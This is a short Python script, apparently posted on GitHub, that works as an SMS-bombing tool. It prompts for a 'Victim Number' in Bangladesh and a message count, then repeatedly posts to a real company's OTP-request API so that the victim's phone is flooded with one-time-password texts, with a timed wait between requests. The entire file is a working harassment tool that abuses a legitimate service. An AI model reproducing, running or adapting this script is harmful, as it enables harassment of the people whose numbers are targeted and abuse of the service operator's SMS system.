import requests,json,sys,os,time

class rabbithole():
    def __init__(self):
        os.system('clear')
        print('\t GITHUB : \x1b[1;92mgithub.com/hasan1818666891\x1b[0m')
        print('\t         RABBITHOLE  OTP')
        print('\t           ANY NUMBER')
        print('\t           ONLY FOR BD') 
        print('\t ===================================\n\n')
        self.target=a=input('  \x1b[0m[\x1b[1;92m*\x1b[0m] Enter Victim Number (01xxxxxxxxx) : \x1b[1;92m')
        loop=input('  \x1b[0m[\x1b[1;92m*\x1b[0m] How many SMS you want to sent : \x1b[1;92m')
        print()
        l=1
        for i in range(int(loop)):sys.stdout.write(f'\r\t\t   \x1b[1;0m [\x1b[1;92m {l} \x1b[1;0mSMS sent in \x1b[1;93m{loop}\x1b[1;0m ]  \r');sys.stdout.flush();self.otp();l+=1
        
    def otp(self):
        self.ses=requests.Session()
        req=self.ses.post('https://apix.rabbitholebd.com/appv2/login/requestOTP',headers={
    "user-agent": "Mozilla/5.0",
    "content-type": "application/json",
        },json={
            "mobile":f"+88{self.target}"
                }).json()#print('\t\x1b[0m'+str(req))
        pt=[]
        for jh in range(120):pt.append(str(jh))
        pt.reverse()
        if 'success' not in str(req):print('\t\x1b[0m'+str(req))
        else:pass
        for ili in pt:sys.stdout.write(f'\r  \x1b[38;5;129m[ Wait for \x1b[1;92m{ili}\x1b[38;5;129ms ] \r');sys.stdout.flush();time.sleep(1)
        
        self.ses.close()
rabbithole()